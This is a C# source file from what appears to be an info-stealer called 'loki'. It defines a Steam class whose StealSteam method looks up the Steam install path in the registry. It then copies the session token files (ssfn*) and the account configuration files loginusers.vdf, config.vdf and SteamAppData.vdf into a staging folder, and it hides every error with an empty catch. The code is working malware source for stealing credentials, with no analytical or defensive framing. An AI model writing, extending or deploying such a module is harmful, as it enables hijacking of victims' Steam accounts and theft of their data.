namespace loki.loki.Utilies.App
{
    using System;
    using System.IO;
    using System.Text;
    using Microsoft.Win32;

    internal class Steam
    {
        public static object Identifier { get; private set; }

        public static void StealSteam(string dir)
        {
            try
            {
                Directory.CreateDirectory(dir + "\\Apps\\Steam");
                string text = Path.Combine(dir, "Apps\\Steam");
                object value = Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null);
                if (value != null)
                {
                    string text2 = value.ToString();
                    var stringBuilder = new StringBuilder();
                    string empty = string.Empty;
                    string text3 = text2;
                    foreach (char value2 in text3)
                    {
                        if (value2.Equals('/'))
                        {
                            stringBuilder.Append("\\");
                        }
                        else
                        {
                            stringBuilder.Append(value2);
                        }
                    }
                    empty = stringBuilder.ToString();
                    if (Directory.Exists(empty))
                    {
                        Directory.CreateDirectory(text);

                        foreach (string text4 in Directory.GetFiles(empty, "ssfn*"))
                        {
                            string fileName = Path.GetFileName(text4);
                            File.Copy(text4, Path.Combine(text, fileName), overwrite: true);
                        }
                        if (File.Exists(empty + "\\config\\config.vdf"))
                        {
                            File.Copy(empty + "\\config\\config.vdf", text + "\\config.vdf");
                        }
                        if (File.Exists(empty + "\\config\\loginusers.vdf"))
                        {
                            File.Copy(empty + "\\config\\loginusers.vdf", text + "\\loginusers.vdf");
                        }
                        if (File.Exists(empty + "\\config\\SteamAppData.vdf"))
                        {
                            File.Copy(empty + "\\config\\SteamAppData.vdf", text + "\\SteamAppData.vdf");
                        }
                    }
                }
            }
            catch (Exception){ }
        }
    }
}